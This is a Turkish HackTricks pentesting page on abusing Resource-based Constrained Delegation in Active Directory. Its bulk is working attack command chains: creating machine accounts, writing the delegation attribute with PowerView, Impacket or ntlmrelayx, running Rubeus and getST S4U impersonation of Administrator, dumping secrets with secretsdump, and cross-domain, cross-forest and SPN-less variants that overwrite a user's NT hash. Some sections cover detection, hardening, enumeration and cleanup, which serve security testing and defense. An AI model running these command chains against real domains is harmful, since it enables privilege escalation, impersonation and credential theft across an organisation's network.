# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegation Temelleri

Resource-based constrained delegation (RBCD), [constrained delegation](constrained-delegation.md) ile benzerdir, ancak güven yönü tersine çevrilmiştir. Geleneksel constrained delegation, bir principal'ın hangi servislere delegasyon yapabileceğini kaydeder; RBCD ise **hedef kaynağın** üzerinde, hangi principal'ların o kaynağa kullanıcıları taklit ederek erişebileceğini kaydeder.<sup>[[12]](#references)</sup>

Hedef nesnenin _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ özniteliği, bu kaynakta başka kimlikler adına hareket etmesine izin verilen principal'ları belirten bir güvenlik tanımlayıcısı içerir.

Bir diğer önemli fark, **bir makine hesabı üzerinde yazma izinlerine** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` ve benzeri haklar) sahip bir principal'ın _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ özniteliğini ayarlayabilmesidir. Geleneksel constrained delegation'ı yapılandırmak için genellikle daha ayrıcalıklı yönetici erişimi gerekir.<sup>[[1]](#references)</sup>

Daha doğrusu, klasik constrained delegation ayarlarını değiştirmek için normalde bir etki alanı denetleyicisinde `SeEnableDelegationPrivilege` gerekir; bu hak genellikle yüksek ayrıcalıklı yöneticilerde bulunur. RBCD, kararı hedef nesnenin güvenlik tanımlayıcısına taşır; bu nedenle ilgili bilgisayar nesnesi özelliğine yazma erişimi, söz konusu kullanıcı hakkı olmadan yeterli olabilir.<sup>[[1]](#references)[[2]](#references)</sup>

### Yeni Kavramlar

`userAccountControl` içindeki **`TrustedToAuthForDelegation`** bayrağı, genellikle **S4U2Self** için bir ön koşul olarak tanımlanır, ancak bu eksik bir açıklamadır.\
SPN'ye sahip bir servis principal'ı, bu bayrak olmadan da S4U2Self isteğinde bulunabilir. `TrustedToAuthForDelegation` etkinse döndürülen servis bileti **forwardable** olur; etkin değilse bilet normalde **non-forwardable** olur.<sup>[[5]](#references)</sup>

Geleneksel constrained delegation, S4U2Proxy adımında **non-forwardable bir TGS'yi** reddeder. RBCD ise hedefin güvenlik tanımlayıcısı istekte bulunan servise yetki veriyorsa bu S4U2Self biletini kabul edebilir.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Saldırı yapısı

> Bir **bilgisayar hesabı** üzerinde **yazma eşdeğeri yetkilere** sahipseniz, o makine üzerinde ayrıcalıklı erişim elde edebilirsiniz.

Saldırganın kurban bilgisayar nesnesi üzerinde zaten **yazma eşdeğeri yetkilere** sahip olduğunu varsayalım.

1. Saldırgan, **SPN**'si olan bir hesabı **ele geçirir** veya bir tane **oluşturur** ("Service A"). Varsayılan olarak, kimliği doğrulanmış bir etki alanı kullanıcısı **_MachineAccountQuota_** tarafından belirlenen en fazla 10 bilgisayar nesnesi oluşturabilir; bilgisayar nesnesi kullanılabilir SPN'leri otomatik olarak sağlar.
2. Saldırgan, kurban bilgisayar (ServiceB) üzerindeki WRITE yetkisini **kötüye kullanarak**, **ServiceA'nın bu kurban bilgisayara (ServiceB) karşı herhangi bir kullanıcıyı taklit etmesine izin verecek şekilde resource-based constrained delegation'ı yapılandırır**.
3. Saldırgan, Service A'dan Service B'ye, Service B'ye **ayrıcalıklı erişimi olan** bir kullanıcı için **tam bir S4U saldırısı** (S4U2Self ve S4U2Proxy) gerçekleştirmek üzere Rubeus kullanır.
   1. S4U2Self (ele geçirilmiş veya oluşturulmuş SPN hesabından): **Administrator'ı Service A'ya temsil eden bir TGS** ister (non-forwardable).
   2. S4U2Proxy: **non-forwardable TGS'yi** kullanarak kurban **host'a** **Administrator'ı** temsil eden bir servis bileti ister.
   3. Service A, hedef kaynağın güvenlik tanımlayıcısında yetkili olduğundan, non-forwardable bilet bu RBCD akışında yine de çalışabilir.
4. Saldırgan, **pass-the-ticket** yapabilir ve **kurban ServiceB'ye erişim kazanmak için** kullanıcıyı **taklit edebilir**.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0`, varsayılan bilgisayar oluşturma yolunu kapatır; ancak hedef bilgisayar nesnesi üzerindeki yazma haklarını veya mevcut bir hesabın kontrolünü ortadan kaldırmaz. SPN'si olmayan, kontrolünüzdeki sıradan bir kullanıcı, aynı etki alanı içinde de, delegasyon yapan principal olarak bazen [SPN-less U2U yöntemi](#spn-less-cross-domain--cross-forest-rbcd) ile kullanılabilir. Bu yol yine de etkin bir RBCD yazma hakkı, delegasyon yapan kullanıcının kimlik bilgileri üzerinde kontrol, delegasyona uygun bir kimliğe bürünülecek kullanıcı, uyumlu Kerberos şifreleme davranışı ve hesabı aksatacak bir NT hash değişikliği gerektirir. Bunları ayrı ön koşullar olarak değerlendirin; RBCD özniteliğinin boş olması veya kotanın sıfır olması tek başına ne saldırının başarılı olacağını ne de ortamın güvenli olduğunu kanıtlar.

Mevcut bir RBCD tanımlayıcısı, delegasyon yapan bilgisayarı doğrudan değil, bir **grubu** da belirtebilir. SPN taşıyan bir bilgisayar hesabını kontrol ediyor ve onu bu gruba ekleyebiliyorsanız, yeni üyelik hedef bilgisayarın RBCD özniteliğini değiştirmeden delegasyon yolunu sağlayabilir. Yolun işe yaradığı sonucuna varmadan önce grubun etkin üyelik yazma ACL'sini (deny ACE'ler dahil), iç içe grup üyeliklerini ve token yenilenmesini, tanımlayıcıdaki trustee SID'yi, kimliğine bürünülecek hesabın delegasyon kısıtlamalarını ve hedef servis SPN'sini kontrol edin.

Etki alanının _**MachineAccountQuota**_ değerini kontrol etmek için şunu kullanabilirsiniz:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Saldırı

### Bilgisayar Nesnesi Oluşturma

**[powermad](https://github.com/Kevin-Robertson/Powermad):** kullanarak etki alanında bir bilgisayar nesnesi oluşturabilirsiniz.<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Resource-based Constrained Delegation Yapılandırma

**Active Directory PowerShell modülünü kullanma**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**powerview kullanarak**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Tam bir S4U attack gerçekleştirme (Windows/Rubeus)

Öncelikle, `123456` parolasıyla yeni Computer nesnesini oluşturduk; bu nedenle bu parolanın hash'ine ihtiyacımız var:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Bu, o hesap için RC4 ve AES hash'lerini yazdırır.\
Şimdi saldırı gerçekleştirilebilir:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Rubeus'un `/altservice` parametresini kullanarak tek seferde istekte bulunup daha fazla hizmet için daha fazla ticket oluşturabilirsiniz:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Kullanıcılar **"Hesap hassastır ve delegasyona izin vermez."** olarak işaretlenebilir. Bu bayrak etkinse, bu delegation akışı üzerinden hesabın kimliğine bürünülemez. BloodHound analiz sırasında bu özelliği gösterir.

### Linux araçları: Impacket ile uçtan uca RBCD (2024+)

Linux kullanıyorsanız, resmi Impacket araçlarını kullanarak tüm RBCD zincirini gerçekleştirebilirsiniz:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Notlar
- LDAP signing/LDAPS zorunluysa `impacket-rbcd -use-ldaps ...` kullanın.
- AES keys kullanmayı tercih edin; birçok modern domain RC4'ü kısıtlar. Impacket ve Rubeus, yalnızca AES kullanılan akışları destekler.
- Impacket bazı araçlarda `sname` değerini ("AnySPN") yeniden yazabilir, ancak mümkün olduğunda doğru SPN'yi edinin (ör. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## Domainler arası ve forest'lar arası RBCD

Kontrol ettiğiniz **delegating principal**, **resource computer**'dan **farklı bir domain**'de (hatta **farklı bir forest**'ta) bulunuyorsa, abuse yine **RBCD**'dir; ancak ticket akışı artık alışılmış tek-domain `S4U2Self -> S4U2Proxy` akışı değildir.

### Domainler arası RBCD: foreign principal'ı SID ile yapılandırma

`msDS-AllowedToActOnBehalfOfOtherIdentity` değerini **farklı bir domain**'den ayarladığınızda, foreign machine/user hedef domain LDAP'ında **ismiyle çözümlenemeyebilir**. Bu durumda delegation girdisini sAMAccountName/UPN yerine foreign principal'ın **SID**'sini kullanarak yapılandırın.

Bu, özellikle NTLM'i LDAP'a `ntlmrelayx.py` ile relay ederken önemlidir:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Notlar:
- `--sid`, `ntlmrelayx.py` aracına `--escalate-user` değerini SID olarak ele almasını söyler; bu, yetki devreden hesap hedef etki alanının dışındaysa gereklidir.
- Araç `User not found in LDAP` yazdırsa bile, güvenlik tanımlayıcısı yabancı SID'yi doğrudan sakladığından yetki devri yazma işlemi yine de başarılı olabilir.

### Etki alanları arası RBCD: realm'ler arası S4U dizisi

Yabancı asıl `msDS-AllowedToActOnBehalfOfOtherIdentity` içine eklendikten sonra, çalışan etki alanları arası akış şöyledir:<sup>[[9]](#references)[[13]](#references)</sup>

1. Yetki devreden asıl için kendi etki alanından bir **TGT** alın.
2. `krbtgt/<target-domain>` için bir **yönlendirme TGT'si** isteyin.
3. Taklit edilen kullanıcı için hedef etki alanı DC'sinde realm'ler arası bir **S4U2Self yönlendirmesi** isteyin.
4. Bu kullanıcı için gerçek **S4U2Self** biletini yetki devreden etki alanında isteyin.
5. Hedef etki alanı için bir yönlendirme bileti almak üzere yetki devreden etki alanında **S4U2Proxy** işlemini gerçekleştirin.
6. `cifs/host.target`, `host/host.target` vb. için hizmet biletini almak üzere hedef etki alanı DC'sinde son **S4U2Proxy** işlemini gerçekleştirin.

Linux'taki standart araçların etki alanları arası RBCD işlemlerinde sıklıkla başarısız olmasının nedeni budur:<sup>[[9]](#references)</sup>
- istek **realm**'inin, `TGS-REQ` içinde kullanılan TGT'nin realm'inden farklı olması gerekebilir
- zincir, yalnızca **S4U2Self** veya hemen ardından tek bir **S4U2Proxy** gelen **S4U2Self** değil, **birbirinden bağımsız S4U2Proxy adımları** gerektirir

### Linux'tan etki alanları arası RBCD

Synacktiv, iki KDC'yi açıkça ele alarak Linux'tan realm'ler arası diziyi yeniden oluşturan bir Impacket `getST.py` uygulaması yayımladı:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Operasyonel olarak yeni argümanlar şunlardır:
- `-dc-ip`: **delegating** domain'in DC'si
- `-targetdomain`: **resource computer**'ın domain'i
- `-targetdc`: **resource** domain'in DC'si

### Cross-forest RBCD sınırlamaları

Cross-forest RBCD'nin önemli bir sınırlaması vardır: **impersonate edilen kullanıcı, delegating principal ile aynı forest'a ait olmalıdır**. Başka bir deyişle, kontrol ettiğiniz makine hesabı `valhalla.local` içindeyse ve hedef resource `asgard.local` içindeyse, genellikle RBCD üzerinden o resource'a erişmek için istediğiniz `asgard.local` kullanıcılarını impersonate **edemezsiniz**.<sup>[[9]](#references)</sup>

Şu durumlarda yine de istismar edilebilir:
- **delegating forest** kullanıcısı, diğer forest'taki resource host üzerinde **local admin** ise (veya başka bir şekilde ayrıcalıklıysa)
- Bir trust gerekli authentication yoluna izin veriyorsa ve hedef bilgisayarın security descriptor'ında yabancı SID kabul ediliyorsa

### Cross-forest RBCD protokolündeki incelikler

Cross-forest RBCD, yalnızca "cross-domain ve bir trust" meselesi değildir. Gözlemlenen akışta, yaygın araçların tarihsel olarak gözden kaçırdığı iki incelik bulunur:<sup>[[9]](#references)</sup>

1. **`PA-PAC-OPTIONS=branch-aware`** ayarlayan ek bir **S4U2Proxy** isteği
2. Diğer etype'lar istenmiş olsa bile son service ticket'ın **RC4** kullanılarak döndürülebilmesi

Uygulamadaki akış şöyledir:

1. Forest A'daki delegating principal için bir TGT alın.
2. Forest A'da impersonate edilecek kullanıcı için **S4U2Self** isteğinde bulunun.
3. Forest B için bir referral TGT almak üzere Forest A'da **S4U2Proxy** isteğinde bulunun.
4. Forest B için başka bir referral TGT almak üzere Forest A'da, S4U2Self ticket'ını additional ticket olarak **kullanmadan**, ancak `branch-aware` etkin durumdayken ikinci bir **S4U2Proxy** isteği gönderin.
5. İsteğe bağlı olarak Forest B'de delegating principal için normal bir service ticket isteyin (son istismar için bu ticket gerekli değildir).
6. Impersonate edilen Forest A kullanıcısı adına hedef SPN'ye yönelik son **S4U2Proxy** ticket'ını istemek için 3. ve 4. adımlarda alınan referral ticket'larını Forest B'de kullanın.

### Linux'tan Cross-forest RBCD

Aynı Synacktiv Impacket branch'i bu mantık için `-forest` seçeneği ekler:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### Özyinelemeli çok etki alanlı RBCD (3+ etki alanı)

**Çok etki alanlı ormanlarda** hem **S4U2Self** hem de **S4U2Proxy**, tek bir yönlendirmeden sonra durmak yerine **özyinelemeli** olabilir:

- **Özyinelemeli S4U2Self**: İlk `S4U2Self`, **taklit edilen kullanıcının etki alanına** gönderilir; ara üst/alt etki alanı geçişleri, `krbtgt/<REALM>` için normal `TGS-REQ` yönlendirmeleriyle yapılır ve **son `S4U2Self`**, **delegasyon yapan sorumlunun kendi etki alanında** gönderilir.
- Bu, yalnızca bir makine hesabına ait **TGT'ye sahip olmanın**, aynı ormandaki başka bir etki alanından bir **yöneticiyi** taklit etmek ve `cifs/host`, `host/host`, `wsman/host` vb. için istek göndermek için yeterli olabileceği anlamına gelir.
- **Özyinelemeli S4U2Proxy** de güven zincirini aynı şekilde izler: Ara geçişlerde, sonraki `krbtgt/<REALM>` yönlendirmesi istenirken önceki bilet TGT olarak yeniden kullanılır ve yalnızca son geçişte nihai hizmet bileti döndürülür.<sup>[[10]](#references)</sup>

Uygulamada aynı orman içindeki bir örnek şöyledir:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### SPN'siz etki alanları arası / ormanlar arası RBCD

**Delegasyon yapan principal, SPN'si olmayan bir kullanıcıysa**, son özyinelemeli `S4U2Self` isteği **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** hatasıyla başarısız olur. Geçici çözüm, yalnızca son adımı **`S4U2Self+U2U`** olarak yeniden denemektir.<sup>[[10]](#references)</sup>

Kötüye kullanım zincirinin kısa özeti:

1. KDC'yi **RC4-HMAC (etype 23)** kullanmaya yönlendirmek için **NT hash** ile kimlik doğrulayın.
2. Önce **`-self -u2u`** isteğinde bulunun ve bu ticket'ı sonraki proxy adımından ayrı tutun.
3. `describeTicket.py` ile **TGT oturum anahtarını** çıkarın.
4. `changepasswd.py -newhashes <session_key>` kullanarak kullanıcının **NT hash** değerini bu **oturum anahtarıyla** değiştirin.
5. `S4U2Self+U2U` ticket'ını ayrı bir **`-proxy`** isteği sırasında **`-additional-ticket`** olarak yeniden kullanın.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Operasyonel uyarılar:

- **İlk güvenilen atlama noktası zaten başka bir forest ise**, yerel Windows davranışıyla eşleşmesi için **branch-aware** algoritmayı (`getST.py ... -forest`) tercih edin. Yabancı forest zincirde ancak **daha sonra** erişiliyorsa, branch-aware olmayan özyinelemeli akış yine de çalışabilir.<sup>[[9]](#references)</sup>
- Güncel **Windows Server 2022/2025** DC'lerde, RC4'ün kullanımdan kaldırılması nedeniyle zorunlu RC4 başarısız olabilir ve **`KDC_ERR_ETYPE_NOSUPP`** hatasına yol açabilir; bu, klasik SPN destekli RBCD AES ile çalışmaya devam etse bile **SPN'siz RBCD'yi imkânsız hâle getirebilir**.<sup>[[15]](#references)</sup>
- Kullanıcının hash/parolasını değiştirmeden önce **`S4U2Self+U2U`** çalıştırın: **`SamrChangePasswordUser`**, hesabın Kerberos AES anahtarlarını **yeniden hesaplamaz**; bu nedenle önce parola değiştirmek sonraki ticket isteklerini bozabilir.<sup>[[14]](#references)</sup>
- Taklit edilen hesabın hâlâ **delegable** olması gerekir: **Protected Users** ve **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** ayarına sahip hesaplar zinciri engeller.

## Tespit / hardening notları

- Domain/forest'ler arasındaki RBCD yolları genellikle **ACL abuse** veya **relay-to-LDAP** yoluyla oluşturulur. Yaygın kurulum yollarını engellemek için DC'lerde **LDAP signing** ve **LDAP channel binding** uygulayın.
- Bilgisayar nesnelerinde `msDS-AllowedToActOnBehalfOfOtherIdentity` özniteliğine kimlerin yazabildiğini denetleyin ve **foreign security principals** dâhil olmak üzere kayıtlı SID'leri çözümleyin.
- Trust yoğun ortamlarında **Selective Authentication**, **SID filtering** ayarlarını ve yabancı bir forest'teki kullanıcıların kaynak host'larda **local admin** haklarına sahip olup olmadığını gözden geçirin.

### Erişim

Son komut satırı **S4U saldırısının tamamını gerçekleştirecek ve TGS'yi** Administrator'dan kurban host'a **bellekte** enjekte edecektir.\
Bu örnekte Administrator'dan **CIFS** hizmeti için bir TGS istendiğinden **C$**'ye erişebileceksiniz:

```bash
ls \\victim.domain.local\C$
```

### Farklı service ticket'ları kötüye kullanma

[**Kullanılabilir service ticket'lar hakkında buradan bilgi edinin**](silver-ticket.md#available-services).

## Listeleme, denetleme ve temizleme

### RBCD yapılandırılmış bilgisayarları listeleme

PowerShell (SID'leri çözümlemek için SD'yi decode etme):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (tek bir komutla oku veya temizle):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### RBCD Temizleme / sıfırlama

- PowerShell (özniteliği temizle):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Kerberos Hataları

- **`KDC_ERR_ETYPE_NOTSUPP`**: Bu, Kerberos'un DES veya RC4 kullanmayacak şekilde yapılandırıldığı ve yalnızca RC4 hash'ini sağladığınız anlamına gelir. Rubeus'a en az AES256 hash'ini sağlayın (ya da yalnızca rc4, aes128 ve aes256 hash'lerini sağlayın). Örnek: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- Normal bir kullanıcı için `-self` sırasında **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**: Delegasyon yapan principal'ın muhtemelen **SPN'si yoktur**. Normal bir `S4U2Self` yerine **`S4U2Self+U2U`** kullanarak **son adımı** yeniden deneyin.<sup>[[10]](#references)</sup>
- **SPN'siz RBCD** sırasında **`KDC_ERR_ETYPE_NOSUPP`**: Yeni DC'ler, `S4U2Self+U2U` + oturum anahtarı değiştirme hilesinin gerektirdiği zorunlu **RC4-HMAC** yolunu reddedebilir. Bunun yerine AES kullanan klasik, **SPN destekli** RBCD yolunu deneyin.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Bu, mevcut bilgisayarın saatinin DC'nin saatinden farklı olduğu ve Kerberos'un düzgün çalışmadığı anlamına gelir.
- **`preauth_failed`**: Bu, verilen kullanıcı adı + hash'lerin oturum açmak için işe yaramadığı anlamına gelir. Hash'leri oluştururken kullanıcı adına `$` eklemeyi unutmuş olabilirsiniz (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Şunlardan biri söz konusu olabilir:
  - Taklit etmeye çalıştığınız kullanıcı istenen hizmete erişemiyordur (ya onu taklit edemediğiniz ya da yeterli ayrıcalığı olmadığı için).
  - İstenen hizmet mevcut değildir (örneğin winrm çalışmıyorken winrm için bilet istemeniz).
  - Oluşturulan sahte bilgisayarın savunmasız sunucu üzerindeki ayrıcalıkları kaldırılmıştır ve bunları geri vermeniz gerekir.
  - Klasik KCD'yi kötüye kullanıyorsunuzdur; RBCD'nin forwardable olmayan S4U2Self biletleriyle çalıştığını, KCD'nin ise forwardable bilet gerektirdiğini unutmayın.

## Notlar, relay'ler ve alternatifler

- LDAP filtrelenmişse RBCD SD'yi AD Web Services (ADWS) üzerinden de yazabilirsiniz. Bkz.:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay zincirleri, genellikle tek adımda yerel SYSTEM yetkisi elde etmek için RBCD ile sonlanır. Uçtan uca pratik örnekler için bkz.:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- LDAP signing/channel binding **devre dışıysa** ve bir makine hesabı oluşturabiliyorsanız, **KrbRelayUp** gibi araçlar zorlanmış bir Kerberos kimlik doğrulamasını LDAP'ye relay edebilir, hedef bilgisayar nesnesinde makine hesabınız için `msDS-AllowedToActOnBehalfOfOtherIdentity` ayarını yapabilir ve uzak makineden S4U aracılığıyla hemen **Administrator** kullanıcısını taklit edebilir.<sup>[[8]](#references)</sup>

## References

- [1] [Köpeği Sallamak: Active Directory'ye Saldırmak için Resource-Based Constrained Delegation'ı Kötüye Kullanma](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Delegasyon Üzerine Bir Söz Daha – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Bilgisayar Nesnesini Ele Geçirme](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Resource-Based Constrained Delegation'ın Kötüye Kullanılması](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Etki Alanını Bitirdi: Saldırgan Bakış Açısıyla Kerberos'a Genel Bakış](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (resmî)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Güncel sözdizimini içeren hızlı Linux kopya kağıdı](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing devre dışı → Kerberos relay ile RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Etki alanları arası ve forest'lar arası RBCD'yi inceleme](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Etki alanları arası ve forest'lar arası RBCD'yi inceleme: 2. bölüm](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket dalı - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation'a genel bakış](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Etki alanları arası S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Kerberos'ta RC4 kullanımını tespit etme ve giderme](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – S4U2Proxy ayrıntıları](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
